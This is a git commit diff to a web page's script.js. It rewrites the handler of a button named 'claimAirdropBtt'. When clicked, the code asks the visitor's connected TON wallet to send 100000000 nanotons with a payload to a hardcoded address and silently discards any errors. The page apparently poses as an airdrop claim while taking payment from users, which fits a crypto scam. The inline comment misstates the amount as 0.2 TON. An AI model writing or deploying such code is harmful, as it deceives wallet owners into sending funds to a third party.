b69b8b695e9e75295f447b0a832c42f50a62329f
hamstermod <hamstermod9@gmail.com>
2025-09-13 00:37:39 +0400

    Update script.js

--- script.js
+++ script.js
@@ -65,18 +65,23 @@ document.getElementById("claimAirdropBtt").onclick = async () => {
 
         const payloadBoc = commentBody.toBoc();
         const base64Payload = btoa(String.fromCharCode(...payloadBoc));
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 60,
-            messages: [
-                {
-                    address: "UQCVM8miBrZr2wZ3fqHzZjpoK8wGbTM0hS25ZVN8cgAwuWkD",
-                    amount: 100000000,
-                    payload:  base64Payload
-                }
-            ]
+       const transaction = {
+    validUntil: Math.floor(Date.now() / 1000) + 300,
+    messages: [
+        {
+            address: "UQCVM8miBrZr2wZ3fqHzZjpoK8wGbTM0hS25ZVN8cgAwuWkD",
+            amount: '100000000', // 0.2 TON (in nanotons)
+            payload: base64Payload
         }
+    ]
+}
 
-        const result = await tonConnectUI.sendTransaction(transaction);
+async function sendTransaction() {
+    const result = await tonConnectUI.sendTransaction(transaction);
+    return result;
+}
+
+sendTransaction();
     }catch(e) {
     }
 }
